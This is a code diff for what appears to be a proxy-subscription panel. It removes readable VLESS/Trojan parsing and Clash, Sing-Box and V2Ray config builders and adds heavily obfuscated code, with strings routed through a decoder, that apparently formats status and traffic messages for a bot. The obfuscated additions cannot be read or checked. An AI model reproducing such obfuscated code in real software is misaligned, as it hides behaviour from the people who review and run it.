+          var_agp += func_dec(1082) + func_eh(func_dec(818)) + func_dec(1083) + (var_adz[func_dec(646)] ? func_dec(1188) : func_dec(825)) + func_dec(448) + var_adz[func_dec(24)] + func_dec(468);
+          var_agp += func_dec(1081);
+          var_agp += func_dec(1085) + func_eh(func_dec(788)) + func_dec(1083) + (Array[func_dec(161)](var_agk) ? var_agk[func_dec(135)] : var_agl + var_agm + var_agn + var_ago) + func_dec(468);
+          var_agp += func_dec(1189) + func_eh(func_dec(790)) + func_dec(1083) + var_agl + func_dec(468);
+          var_agp += func_dec(1190) + func_eh(func_dec(792)) + func_dec(1083) + var_agm + func_dec(468);
+          var_agp += func_dec(1191) + func_eh(func_dec(794)) + func_dec(1083) + var_agn + func_dec(468);
+          var_agp += func_dec(1192) + func_eh(func_dec(796)) + func_dec(1083) + var_ago + func_dec(468);
+          if (!var_aea) {
+            const var_ahc = Math[func_dec(16)]((Date[func_dec(170)]() - var_e) / 1000);
+            const var_ahd = Math[func_dec(16)](var_ahc / 3600);
+            const var_ahe = Math[func_dec(16)](var_ahc % 3600 / 60);
+            var_agp += func_dec(1133) + func_eh(func_dec(697)) + func_dec(1083) + var_ahd + func_dec(1167) + var_ahe + func_dec(1168);
+            var_agp += func_dec(1138) + func_eh(func_dec(699)) + func_dec(1083) + var_f + func_dec(468);
+            var_agp += func_dec(1193) + (var_d[func_dec(57)] ? func_eh(func_dec(293)) : func_eh(func_dec(292))) + func_dec(468);
+          }
+          var_agp += func_dec(1088);
+          const var_agq = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_agp, var_agq, var_adx);
+        } else if (var_ady === func_dec(484)) {
+          let var_ahf, var_ahg, var_ahh;
+          let var_ahi = 0,
+            var_ahj = 0;
+          if (var_aea) {
+            const var_ahm = await func_bb(var_adz);
+            if (var_ahm[func_dec(108)] && var_ahm[func_dec(225)]) {
+              const var_ahn = var_ahm[func_dec(225)];
+              var_ahf = [];
+              var_ahg = var_ahn[func_dec(582)]?.[func_dec(583)] || 0;
+              var_ahh = var_ahn[func_dec(582)]?.[func_dec(585)] || 0;
+            } else {
+              const var_aho = await func_en();
+              var_ahf = var_aho || [];
+              var_ahg = 0;
+              var_ahh = 0;
+            }
+          } else {
+            var_ahf = var_d[func_dec(67)] || [];
+            var_ahg = 0;
+            var_ahh = 0;
+            const var_ahp = new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+            var_ahf[func_dec(176)](var_ahq => {
+              const var_ahr = var_ahq[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+              const var_ahs = var_t?.[func_dec(67)]?.[var_ahr] || {
+                [func_dec(17)]: 0,
+                [func_dec(23)]: 0,
+                [func_dec(21)]: func_dec(3)
+              };
+              var_ahg += var_ahs[func_dec(17)] || 0;
+              if (var_ahs[func_dec(21)] === var_ahp) var_ahh += var_ahs[func_dec(23)] || 0;
+              var_ahi += func_f(var_ahs);
+              var_ahj += func_g(var_ahs, var_ahp);
+            });
+          }
+          let var_ahk = func_dec(1194) + func_eh(func_dec(783)) + func_dec(1125);
+          var_ahk += func_dec(1081);
+          var_ahk += func_dec(1082) + func_eh(func_dec(818)) + func_dec(1083) + (var_adz[func_dec(646)] ? func_dec(1188) : func_dec(825)) + func_dec(448) + var_adz[func_dec(24)] + func_dec(468);
+          var_ahk += func_dec(1081);
+          var_ahk += func_dec(1085) + func_eh(func_dec(788)) + func_dec(1083) + (Array[func_dec(161)](var_ahf) ? var_ahf[func_dec(135)] : func_dec(1195)) + func_dec(468);
+          var_ahk += func_dec(1129) + func_eh(func_dec(802)) + func_dec(1083) + (var_ahi / 1073741824)[func_dec(180)](2) + func_dec(1196);
+          var_ahk += func_dec(1135) + func_eh(func_dec(804)) + func_dec(1083) + (var_ahj / 1073741824)[func_dec(180)](2) + func_dec(1196);
+          if (!var_aea) {
+            const var_aht = Math[func_dec(16)]((Date[func_dec(170)]() - var_e) / 1000);
+            const var_ahu = Math[func_dec(16)](var_aht / 3600);
+            const var_ahv = Math[func_dec(16)](var_aht % 3600 / 60);
+            var_ahk += func_dec(1133) + func_eh(func_dec(929)) + func_dec(1083) + var_ahu + func_dec(1167) + var_ahv + func_dec(1168);
+            var_ahk += func_dec(1138) + func_eh(func_dec(930)) + func_dec(1083) + var_f + func_dec(468);
+            var_ahk += func_dec(1197) + func_eh(func_dec(932)) + func_dec(1198) + var_a + func_dec(468);
+          }
+          var_ahk += func_dec(1088);
+          if (var_d[func_dec(54)] && var_d[func_dec(55)]) {
+            const var_ahw = await func_aj(var_d[func_dec(54)], var_d[func_dec(55)]);
+            if (var_ahw !== null) {
+              const var_ahx = (var_ahw / 100000 * 100)[func_dec(180)](2);
+              var_ahk += func_dec(1199) + var_ahw + func_dec(1165) + var_ahx + func_dec(1166);
+            }
+          }
+          const var_ahl = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1153) + func_eh(func_dec(835)) + func_dec(3),
+              [func_dec(480)]: func_dec(484)
+            }], [{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_ahk, var_ahl, var_adx);
+        } else if (var_ady === func_dec(490)) {
+          let var_ahy = func_dec(1200) + func_eh(func_dec(489)) + func_dec(1125);
+          var_ahy += func_dec(1081);
+          var_ahy += func_dec(1082) + func_eh(func_dec(818)) + func_dec(1083) + (var_adz[func_dec(646)] ? func_dec(1188) : func_dec(825)) + func_dec(448) + var_adz[func_dec(24)] + func_dec(468);
+          if (var_adz[func_dec(646)]) {
+            var_ahy += func_dec(1201) + var_aai + func_dec(468);
+            var_ahy += func_dec(1202) + var_d[func_dec(25)] + func_dec(1108);
+            var_ahy += func_dec(1203) + (var_d[func_dec(38)] || func_dec(39)) + func_dec(468);
+            var_ahy += func_dec(1204) + (var_d[func_dec(42)] || func_dec(43)) + func_dec(468);
+          } else {
+            var_ahy += func_dec(1201) + var_adz[func_dec(303)] + func_dec(468);
+            var_ahy += func_dec(1202) + var_adz[func_dec(25)] + func_dec(1108);
+          }
+          var_ahy += func_dec(1205) + var_a + func_dec(468);
+          var_ahy += func_dec(1088);
+          const var_ahz = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_ahy, var_ahz, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1206))) {
+          const var_aia = await func_en();
+          const var_aib = var_aia || [];
+          const var_aic = var_aib[func_dec(412)](var_aid => var_aid[func_dec(57)]);
+          if (var_aic[func_dec(135)] === 0) {
+            const var_aie = {
+              [func_dec(504)]: [[{
+                [func_dec(200)]: func_eh(func_dec(798)),
+                [func_dec(480)]: func_dec(1116)
+              }]]
             };
-        }
-        if (mode === "manual") {
-            const raw = String(p.segManual || "").trim().slice(0, 4000);
-            if (!raw) return null;
-            if (raw.charAt(0) === "{") {
-                let obj = null;
-                try {
-                    obj = JSON.parse(raw);
-                } catch (e) {
-                    return null;
-                }
-                if (
-                    !obj ||
-                    typeof obj !== "object" ||
-                    !Array.isArray(obj.tcp) ||
-                    obj.tcp.length === 0
-                )
-                    return null;
-                return { kind: "fm", value: { tcp: obj.tcp } };
-            }
-            if (
-                /^\d{1,5}-\d{1,5},\d{1,5}-\d{1,5},(tlshello|\d{1,3}-\d{1,3})$/.test(
-                    raw,
-                )
-            )
-                return { kind: "classic", value: raw };
-            return null;
-        }
-        return null;
-    } catch (e) {
-        return null;
-    }
-}
-function buildSegFragmentParam(p) {
-    // Returns "" or "&fragment=..." / "&fm=..." (already encoded).
-    try {
-        const r = resolveSegFragment(p);
-        if (!r) return "";
-        if (r.kind === "fm")
-            return "&fm=" + encodeURIComponent(JSON.stringify(r.value));
-        return "&fragment=" + encodeURIComponent(String(r.value));
-    } catch (e) {
-        return "";
-    }
-}
-function getSegStreamExtra(p) {
-    // Xray streamSettings object for vjson builder: { finalmask } | { fragment } | {}.
-    try {
-        const r = resolveSegFragment(p);
-        if (!r) return {};
-        if (r.kind === "fm") return { finalmask: r.value };
-        const m = String(r.value).split(",");
-        return {
-            fragment: { packets: m[2], length: m[0], interval: m[1] },
-        };
-    } catch (e) {
-        return {};
-    }
-}
-function buildTlsMaskParam(p) {
-    // Returns "" or "&cs=..." (already encoded).
-    try {
-        if (!p || !p.tlsMask) return "";
-        const v = String(p.tlsMask).trim().slice(0, 2000);
-        if (!/^(TLS_[A-Za-z0-9_]+)(:TLS_[A-Za-z0-9_]+)*$/.test(v)) return "";
-        return "&cs=" + encodeURIComponent(v);
-    } catch (e) {
-        return "";
-    }
-}
-function isSegEnabled(p) {
-    try {
-        if (!p) return false;
-        const mode = String(p.segMode || "off").toLowerCase();
-        if (mode !== "builder" && mode !== "manual") return false;
-        return buildSegFragmentParam(p) !== "";
-    } catch (e) {
-        return false;
-    }
-}
-
-// ─── Upstream VLESS URI Parser ───────────────────────────────────────
-// Parses a VLESS URI like:
-//   vless://uuid@server:port?type=ws&security=tls&sni=example.com&path=/ws#Name
-// into a structured object usable by Sing-Box, Clash, and V2Ray builders.
-function parseVlessUri(uri) {
-    if (!uri || typeof uri !== "string") return null;
-    uri = uri.trim();
-    if (!uri.startsWith("vless://")) return null;
-    try {
-        // Remove the scheme
-        let rest = uri.slice(8); // after "vless://"
-        // Split fragment (#name)
-        let fragment = "";
-        let hashIdx = rest.indexOf("#");
-        if (hashIdx !== -1) {
-            fragment = decodeURIComponent(rest.slice(hashIdx + 1));
-            rest = rest.slice(0, hashIdx);
-        }
-        // Split query string (?params)
-        let queryStr = "";
-        let qIdx = rest.indexOf("?");
-        if (qIdx !== -1) {
-            queryStr = rest.slice(qIdx + 1);
-            rest = rest.slice(0, qIdx);
-        }
-        // Parse query params
-        let params = {};
-        if (queryStr) {
-            queryStr.split("&").forEach((pair) => {
-                let [k, v] = pair.split("=");
-                if (k) params[decodeURIComponent(k)] = decodeURIComponent(v || "");
+            await func_ej(var_adw, func_dec(1093) + func_eh(func_dec(777)) + func_dec(3), var_aie, var_adx);
+          } else {
+            const var_aif = parseInt(var_ady[func_dec(155)](func_dec(1206), func_dec(3))) || 0;
+            const var_aig = 5;
+            const var_aih = var_aif * var_aig;
+            const var_aii = var_aih + var_aig;
+            const var_aij = var_aic[func_dec(145)](var_aih, var_aii);
+            let var_aik = func_dec(1192) + func_eh(func_dec(758)) + func_dec(1104) + var_aic[func_dec(135)] + func_dec(1207);
+            const var_ail = [];
+            var_aij[func_dec(176)](var_ain => {
+              const var_aio = var_ain[func_dec(184)] || func_eh(func_dec(293));
+              var_aik += func_dec(1124) + var_ain[func_dec(24)] + func_dec(1208) + var_aio + func_dec(468);
+              var_ail[func_dec(429)]([{
+                [func_dec(200)]: func_dec(495) + var_ain[func_dec(24)] + func_dec(3),
+                [func_dec(480)]: func_dec(1147) + var_ain[func_dec(172)] + func_dec(3)
+              }]);
             });
-        }
-        // Parse uuid@server:port
-        let atIdx = rest.indexOf("@");
-        if (atIdx === -1) return null;
-        let uuid = rest.slice(0, atIdx);
-        let hostPort = rest.slice(atIdx + 1);
-        let server, port;
-        // Handle IPv6 [addr]:port
-        if (hostPort.startsWith("[")) {
-            let bracketEnd = hostPort.indexOf("]");
-            server = hostPort.slice(1, bracketEnd);
-            port = parseInt(hostPort.slice(bracketEnd + 2)) || 443;
-        } else {
-            let colonIdx = hostPort.lastIndexOf(":");
-            server = hostPort.slice(0, colonIdx);
-            port = parseInt(hostPort.slice(colonIdx + 1)) || 443;
-        }
-        return {
-            uuid,
-            server,
-            port,
-            name: fragment || "Upstream",
-            security: params.security || "tls",
-            sni: params.sni || params.servername || server,
-            host: params.host || server,
-            path: params.path || "/",
-            type: params.type || "ws",
-            fp: params.fp || params["client-fingerprint"] || "random",
-            allowInsecure: params.allowInsecure === "1" || params.allowInsecure === "true",
-            pbk: params.pbk || "",
-            sid: params.sid || "",
-            flow: params.flow || "",
-            encryption: params.encryption || "none",
-            alpn: params.alpn || "",
-            mode: params.mode || "",
-            raw: uri,
-        };
-    } catch (e) {
-        return null;
-    }
-}
-
-// Convert parsed VLESS URI to a Sing-Box outbound object
-function upstreamToSingboxOb(parsed) {
-    if (!parsed) return null;
-    let ob = {
-        type: "vless",
-        tag: "🔗 " + parsed.name,
-        server: parsed.server,
-        server_port: parsed.port,
-        uuid: parsed.uuid,
-        packet_encoding: "xudp",
-        network: parsed.type || "ws",
-        tls: {
-            enabled: parsed.security === "tls" || parsed.security === "reality",
-            server_name: parsed.sni,
-            insecure: parsed.allowInsecure,
-            utls: { enabled: true, fingerprint: parsed.fp || "randomized" },
-        },
-        transport: {
-            type: parsed.type || "ws",
-            path: parsed.path || "/",
-            headers: { Host: parsed.host || parsed.sni },
-        },
-    };
-    if (parsed.flow) ob.flow = parsed.flow;
-    if (parsed.pbk) {
-        ob.tls.reality = {
-            enabled: true,
-            public_key: parsed.pbk,
-            short_id: parsed.sid || "",
-        };
-    }
-    if (parsed.alpn) ob.tls.alpn = parsed.alpn.split(",");
-    return ob;
-}
-
-// Convert parsed VLESS URI to a Clash/Mihomo proxy object (YAML-compatible)
-function upstreamToClashProxy(parsed) {
-    if (!parsed) return null;
-    let proxy = {
-        name: parsed.name,
-        type: "vless",
-        server: parsed.server,
-        port: parsed.port,
-        uuid: parsed.uuid,
-        udp: true,
-        tls: parsed.security === "tls" || parsed.security === "reality",
-        servername: parsed.sni,
-        "client-fingerprint": parsed.fp || "random",
-        "skip-cert-verify": parsed.allowInsecure,
-        network: parsed.type || "ws",
-        "ws-opts": {
-            path: parsed.path || "/",
-            headers: { Host: parsed.host || parsed.sni },
-        },
-    };
-    if (parsed.flow) proxy.flow = parsed.flow;
-    if (parsed.pbk) {
-        proxy["reality-opts"] = {
-            "public-key": parsed.pbk,
-            "short-id": parsed.sid || "",
-        };
-    }
-    if (parsed.alpn) proxy.alpn = parsed.alpn.split(",");
-    return proxy;
-}
-
-// Convert parsed VLESS URI to a V2Ray JSON outbound object
-function upstreamToV2RayOb(parsed) {
-    if (!parsed) return null;
-    let ob = {
-        tag: "🔗 " + parsed.name,
-        protocol: "vless",
-        settings: {
-            vnext: [
-                {
-                    address: parsed.server,
-                    port: parsed.port,
-                    users: [
-                        {
-                            id: parsed.uuid,
-                            encryption: parsed.encryption || "none",
-                            flow: parsed.flow || "",
-                        },
-                    ],
-                },
-            ],
-        },
-        streamSettings: {
-            network: parsed.type || "ws",
-            security: parsed.security === "tls" || parsed.security === "reality" ? "tls" : "none",
-            tlsSettings: parsed.security === "tls" ? {
-                serverName: parsed.sni,
-                allowInsecure: parsed.allowInsecure,
-                fingerprint: parsed.fp || "random",
-            } : undefined,
-            realitySettings: parsed.security === "reality" ? {
-                serverName: parsed.sni,
-                publicKey: parsed.pbk || "",
-                shortId: parsed.sid || "",
-                fingerprint: parsed.fp || "random",
-            } : undefined,
-            wsSettings: {
-                path: parsed.path || "/",
-                headers: { Host: parsed.host || parsed.sni },
-            },
-        },
-    };
-    return ob;
-}
-
-async function buildUriProfile(
-    hostName,
-    targetSub = null,
-    allowInsecure = false,
-) {
-    let ports = sysConfig.socketPorts
-        ? sysConfig.socketPorts
-              .split(",")
-              .map((s) => s.trim())
-              .filter(Boolean)
-        : ["443"];
-    let reqPath = encodeURI(`/${sysConfig.apiRoute}`);
-
-    let lines = [];
-    let profiles = getAllProfiles(targetSub);
-    let allHostNames = [
-        ...new Set(profiles.flatMap((p) => getProfileHostNames(hostName, p))),
-    ];
-    await preloadIpFlags(profiles, allHostNames);
-
-    // Add fake configs
-    let fakeNames = getFakeConfigNames(targetSub);
-    fakeNames.forEach((name) => {
-        lines.push(
-            `trojan://00000000-0000-0000-0000-000000000000@127.0.0.1:1080?security=none#${encodeURI(name)}`,
-        );
-    });
-
-    profiles.forEach((p) => {
-        let pips = getEffectivePips(p);
-        let effectiveMode = p.userMode || sysConfig.mode;
-        let effectivePorts = p.userPorts
-            ? p.userPorts
-                  .split(",")
-                  .map((s) => s.trim())
-                  .filter(Boolean)
-            : ports;
-        let maxCfg = p.maxConfigs || null;
-
-        let configIndex = 0;
-        let profileHostNames = getProfileHostNames(hostName, p);
-
-        profileHostNames.forEach((hName) => {
-            let ipEntries = getCleanIpsWithNames(hName, p.cleanIp);
-            let allIps = ipEntries.map((e) => e.ip);
-            let ips = calcEffectiveIps(
-                allIps,
-                maxCfg,
-                effectiveMode,
-                effectivePorts,
-                pips.length
-            );
-            let ipNameMap = {};
-            ipEntries.forEach((e) => {
-                ipNameMap[e.ip] = e.name;
+            const var_aim = [];
+            if (var_aif > 0) var_aim[func_dec(429)]({
+              [func_dec(200)]: func_dec(1111) + func_eh(func_dec(716)) + func_dec(3),
+              [func_dec(480)]: func_dec(1206) + (var_aif - 1) + func_dec(3)
             });
-            effectivePorts.forEach((port) => {
-                let sec = getTransportParams(port);
-                let extBase = `encryption=none&security=${sec}&sni=${hName}&fp=${sysConfig.agent}&type=ws&host=${hName}&path=${reqPath}`;
-                if (sysConfig.enableOpt2) extBase += `&pbk=enabled`;
-                extBase += `&allowInsecure=${allowInsecure ? "1" : "0"}`;
-                // Per-user segmentation (fragment/finalmask) + TLS mask.
-                try {
-                    extBase += buildSegFragmentParam(p);
-                    extBase += buildTlsMaskParam(p);
-                } catch (e) {}
-                ips.forEach((ip) => {
-                    let _pips = pips.length > 0 ? pips : [null];
-                    _pips.forEach((selectedProxyIp) => {
-                    let ipName = ipNameMap[ip] || "";
-                    let vName = getConfigName(
-                        "alpha",
-                        p.name,
-                        port,
-                        hName,
-                        ip,
-                        selectedProxyIp,
-                        configIndex,
-                        ipName,
-                    );
-                    let tName = getConfigName(
-                        "beta",
-                        p.name,
-                        port,
-                        hName,
-                        ip,
-                        selectedProxyIp,
-                        configIndex,
-                        ipName,
-                    );
-                    if (effectiveMode === "alpha" || effectiveMode === "both") {
-                        let configUuid = generateConfigUuid(p.id, configIndex);
-                        registerConfigEntry(
-                            configUuid,
-                            p.id,
-                            selectedProxyIp || "",
-                        );
-                        lines.push(
-                            `${getAlpha()}://${configUuid}@${ip}:${port}?${extBase}#${vName}`,
-                        );
-                    }
-                    if (effectiveMode === "beta" || effectiveMode === "both") {
-                        let randomJunk = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadTr = {
-                            junk: randomJunk,
-                            protocol: "tr",
-                            mode: "proxyip",
-                            panelIPs: [],
-                            relayIdx: configIndex,
-                        };
-                        let pathStrTr = "/" + btoa(JSON.stringify(payloadTr));
-                        let trojanExtBase = `security=${sec}&sni=${hName}&fp=${sysConfig.agent}&type=ws&host=${hName}&path=${encodeURIComponent(pathStrTr)}`;
-                        if (sysConfig.enableOpt2)
-                            trojanExtBase += `&pbk=enabled`;
-                        trojanExtBase += `&allowInsecure=${allowInsecure ? "1" : "0"}`;
-                        try {
-                            trojanExtBase += buildSegFragmentParam(p);
-                            trojanExtBase += buildTlsMaskParam(p);
-                        } catch (e) {}
-                        lines.push(
-                            `${getBeta()}://${p.id}@${ip}:${port}?${trojanExtBase}#${tName}`,
-                        );
-                    }
-                    if (sysConfig.enableDirectConfigs && pips.length > 0 && selectedProxyIp === pips[0]) {
-                        configIndex++;
-                        let dvName = getConfigName(
-                            "alpha",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            null,
-                            configIndex,
-                            ipName,
-                            true
-                        );
-                        let dtName = getConfigName(
-                            "beta",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            null,
-                            configIndex,
-                            ipName,
-                            true
-                        );
-                        if (
-                            effectiveMode === "alpha" ||
-                            effectiveMode === "both"
-                        ) {
-                            let configUuid = generateConfigUuid(
-                                p.id,
-                                configIndex,
-                            );
-                            registerConfigEntry(configUuid, p.id, "");
-                            lines.push(
-                                `${getAlpha()}://${configUuid}@${ip}:${port}?${extBase}#${dvName}`,
-                            );
-                        }
-                        if (
-                            effectiveMode === "beta" ||
-                            effectiveMode === "both"
-                        ) {
-                            let randomJunk2 = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadTr2 = {
-                                junk: randomJunk2,
-                                protocol: "tr",
-                                mode: "proxyip",
-                                panelIPs: [],
-                                relayIdx: configIndex,
-                            };
-                            let pathStrTr2 =
-                                "/" + btoa(JSON.stringify(payloadTr2));
-                            let trojanExtBase2 = `security=${sec}&sni=${hName}&fp=${sysConfig.agent}&type=ws&host=${hName}&path=${encodeURIComponent(pathStrTr2)}`;
-                            if (sysConfig.enableOpt2)
-                                trojanExtBase2 += `&pbk=enabled`;
-                            trojanExtBase2 += `&allowInsecure=${allowInsecure ? "1" : "0"}`;
-                            try {
-                                trojanExtBase2 += buildSegFragmentParam(p);
-                                trojanExtBase2 += buildTlsMaskParam(p);
-                            } catch (e) {}
-                            lines.push(
-                                `${getBeta()}://${p.id}@${ip}:${port}?${trojanExtBase2}#${dtName}`,
-                            );
-                        }
-                    }
-                    configIndex++;
-                    });
-                });
+            if (var_aii < var_aic[func_dec(135)]) var_aim[func_dec(429)]({
+              [func_dec(200)]: func_dec(3) + func_eh(func_dec(718)) + func_dec(1113),
+              [func_dec(480)]: func_dec(1206) + (var_aif + 1) + func_dec(3)
             });
-        });
-    });
-    // ─── Upstream: prepend upstream URI ───
-    let parsedUpstream = parseVlessUri(sysConfig.upstreamUri);
-    if (parsedUpstream) {
-        lines.unshift(parsedUpstream.raw);
-    }
-    return lines.join("\n");
-}
-
-
-let clashTemplate = null;
-let singboxTemplate = null;
-let VTemplate = null;
-
-async function fetchTemplates(env) {
-    const repo = sysConfig.githubRepo || "itsyebekhe/nahan";
-    if (!clashTemplate) {
-        try {
-            let res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/clash.yml`);
-            if (res.ok) clashTemplate = await res.text();
-        } catch(e) {}
-    }
-    if (!singboxTemplate) {
-        try {
-            let res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/singbox.json`);
-            if (res.ok) singboxTemplate = await res.json();
-        } catch(e) {}
-    }
-    if (!VTemplate) {
-        try {
-            let res = await fetchT(`https://raw.githubusercontent.com/${repo}/main/v.json`);
-            if (res.ok) VTemplate = await res.json();
-        } catch(e) {}
-    }
-}
-
-
-function getCustomRouting() {
-    let cr = sysConfig.customRouting || "";
-    let lines = cr.split('\n').map(l => l.trim()).filter(Boolean);
-    let domains = [];
-    let ips = [];
-    let geoips = [];
-    let geosites = [];
-    for (let l of lines) {
-        let low = l.toLowerCase();
-        if (low.startsWith("geoip:")) {
-            geoips.push(l.substring(6).trim().toUpperCase());
-        } else if (low.startsWith("geosite:")) {
-            geosites.push(l.substring(8).trim().toLowerCase());
-        } else if (l.match(/^[0-9\.\/:]+$/)) {
-            ips.push(l);
-        } else {
-            domains.push(l);
-        }
-    }
-    return { domains, ips, geoips, geosites };
-}
-
-async function buildYamlProfile(hostName, targetSub = null, allowInsecure = false, env = null) {
-    let ports = sysConfig.socketPorts
-        ? sysConfig.socketPorts
-              .split(",")
-              .map((s) => s.trim())
-              .filter(Boolean)
-        : ["443"];
-    let reqPath = encodeURI(`/${sysConfig.apiRoute}`);
-    let proxies = [];
-    let proxyNames = [];
-    let nameCounts = {}; // Track proxy names for deduplication
-    let profiles = getAllProfiles(targetSub);
-    let allHostNames = [
-        ...new Set(profiles.flatMap((p) => getProfileHostNames(hostName, p))),
-    ];
-    await preloadIpFlags(profiles, allHostNames);
-    let proxyGeoInfo = new Map(); // proxyName -> {country, flag}
-
-    // Add fake configs
-    let fakeNames = getFakeConfigNames(targetSub);
-    let fakeRefs = [];
-    fakeNames.forEach((name) => {
-        proxies.push(
-            `- name: "${name}"\n  type: ${getBeta()}\n  server: 127.0.0.1\n  port: 80\n  password: "${activeDeviceId}"\n  udp: true\n  tls: false`,
-        );
-        fakeRefs.push(`"${name}"`);
-    });
-
-    const getUniqueName = (baseName) => {
-        if (!nameCounts[baseName]) {
-            nameCounts[baseName] = 1;
-            return baseName;
-        }
-        let counter = nameCounts[baseName];
-        let newName = `${baseName}-${counter}`;
-        while (nameCounts[newName]) {
-            counter++;
-            newName = `${baseName}-${counter}`;
-        }
-        nameCounts[baseName] = counter + 1;
-        nameCounts[newName] = 1;
-        return newName;
-    };
-
-    profiles.forEach((p) => {
-        let pips = getEffectivePips(p);
-        let effectiveMode = p.userMode || sysConfig.mode;
-        let effectivePorts = p.userPorts
-            ? p.userPorts
-                  .split(",")
-                  .map((s) => s.trim())
-                  .filter(Boolean)
-            : ports;
-        let maxCfg = p.maxConfigs || null;
-
-        let configIndex = 0;
-        let profileHostNames = getProfileHostNames(hostName, p);
-
-        profileHostNames.forEach((hName) => {
-            let ipEntries = getCleanIpsWithNames(hName, p.cleanIp);
-            let allIps = ipEntries.map((e) => e.ip);
-            let ips = calcEffectiveIps(
-                allIps,
-                maxCfg,
-                effectiveMode,
-                effectivePorts,
-                pips.length
-            );
-            let ipNameMap = {};
-            ipEntries.forEach((e) => {
-                ipNameMap[e.ip] = e.name;
-            });
-            effectivePorts.forEach((port) => {
-                let sec = getTransportParams(port) === "tls" ? "true" : "false";
-                ips.forEach((ip) => {
-                    let _pips = pips.length > 0 ? pips : [null];
-                    _pips.forEach((selectedProxyIp) => {
-                    let ipName = ipNameMap[ip] || "";
-                    if (effectiveMode === "alpha" || effectiveMode === "both") {
-                        let vName = getConfigName(
-                            "alpha",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            selectedProxyIp,
-                            configIndex,
-                            ipName,
-                        );
-                        vName = getUniqueName(vName);
-                        proxyNames.push(`"${vName}"`);
-                        proxyGeoInfo.set(
-                            vName,
-                            getGeoInfo(selectedProxyIp || ip),
-                        );
-                        let randomJunk = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadVl = {
-                            junk: randomJunk,
-                            protocol: "vl",
-                            mode: "proxyip",
-                            panelIPs: [],
-                        };
-                        let pathStrVl = "/" + btoa(JSON.stringify(payloadVl));
-                        let configUuid = generateConfigUuid(p.id, configIndex);
-                        registerConfigEntry(
-                            configUuid,
-                            p.id,
-                            selectedProxyIp || "",
-                        );
-                        proxies.push(
-                            `- name: "${vName.replace(/"/g, '""')}"\n  type: ${getAlpha()}\n  server: ${ip}\n  port: ${port}\n  uuid: ${configUuid}\n  udp: true\n  tls: ${sec}\n  servername: ${hName}\n  client-fingerprint: ${sysConfig.agent || "random"}\n  network: ws\n  ws-opts:\n    path: "${pathStrVl}"\n    headers:\n      Host: ${hName}\n  skip-cert-verify: ${allowInsecure}\n${sysConfig.enableOpt1 ? "  tfo: true" : ""}`,
-                        );
-                    }
-                    if (effectiveMode === "beta" || effectiveMode === "both") {
-                        let tName = getConfigName(
-                            "beta",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            selectedProxyIp,
-                            configIndex,
-                            ipName,
-                        );
-                        tName = getUniqueName(tName);
-                        proxyNames.push(`"${tName}"`);
-                        proxyGeoInfo.set(
-                            tName,
-                            getGeoInfo(selectedProxyIp || ip),
-                        );
-                        let randomJunkTr = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadTr = {
-                            junk: randomJunkTr,
-                            protocol: "tr",
-                            mode: "proxyip",
-                            panelIPs: [],
-                            relayIdx: configIndex,
-                        };
-                        let pathStrTr = "/" + btoa(JSON.stringify(payloadTr));
-                        proxies.push(
-                            `- name: "${tName.replace(/"/g, '""')}"\n  type: ${getBeta()}\n  server: ${ip}\n  port: ${port}\n  password: "${p.id}"\n  udp: true\n  tls: ${sec}\n  sni: ${hName}\n  client-fingerprint: ${sysConfig.agent || "random"}\n  network: ws\n  ws-opts:\n    path: "${pathStrTr}"\n    headers:\n      Host: ${hName}\n  skip-cert-verify: ${allowInsecure}\n${sysConfig.enableOpt1 ? "  tfo: true" : ""}`,
-                        );
-                    }
-                    configIndex++;
-                    if (sysConfig.enableDirectConfigs && pips.length > 0 && selectedProxyIp === pips[0]) {
-                        let dcIndex = configIndex;
-                        if (
-                            effectiveMode === "alpha" ||
-                            effectiveMode === "both"
-                        ) {
-                            let dvName = getUniqueName(
-                                getConfigName(
-                                    "alpha",
-                                    p.name,
-                                    port,
-                                    hName,
-                                    ip,
-                                    null,
-                                    dcIndex,
-                                    ipName,
-                                    true
-                                ),
-                            );
-                            proxyNames.push(`"${dvName}"`);
-                            proxyGeoInfo.set(dvName, getGeoInfo(ip));
-                            let randomJunk = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadVl = {
-                                junk: randomJunk,
-                                protocol: "vl",
-                                mode: "proxyip",
-                                panelIPs: [],
-                            };
-                            let pathStrVl =
-                                "/" + btoa(JSON.stringify(payloadVl));
-                            let configUuid = generateConfigUuid(p.id, dcIndex);
